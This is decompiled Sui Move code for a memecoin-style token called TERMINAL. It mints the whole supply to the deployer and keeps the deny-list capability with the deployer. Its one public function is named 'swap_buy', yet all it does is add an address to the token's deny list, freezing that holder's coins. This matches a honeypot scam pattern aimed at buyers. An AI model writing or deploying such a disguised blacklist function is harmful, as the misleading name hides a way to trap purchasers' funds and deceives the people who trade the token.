module 0xa3c079eb7f1b2a9fb44033c891de02a815208dd2f2de144ba67835ee42111f8a::terminal {
    struct TERMINAL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TERMINAL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TERMINAL>(arg0, 9, b"TERMINAL", b"Book Terminal of Truths", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmd2Hcejn4xWJccE8yquaBrTUgAeSQVjn5VV8ubArFaBn8"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TERMINAL>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TERMINAL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TERMINAL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TERMINAL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TERMINAL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TERMINAL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

